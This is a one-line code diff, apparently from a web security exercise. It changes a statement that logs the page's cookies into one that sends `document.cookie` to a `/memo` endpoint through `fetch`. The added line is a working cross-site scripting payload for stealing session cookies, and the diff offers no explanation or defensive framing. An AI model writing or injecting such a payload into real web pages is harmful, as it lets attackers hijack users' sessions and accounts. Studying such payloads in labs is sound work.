@@ -1,1 +1,1 @@
-console.log(document.cookie);
+fetch("/memo?memo=" + document.cookie);
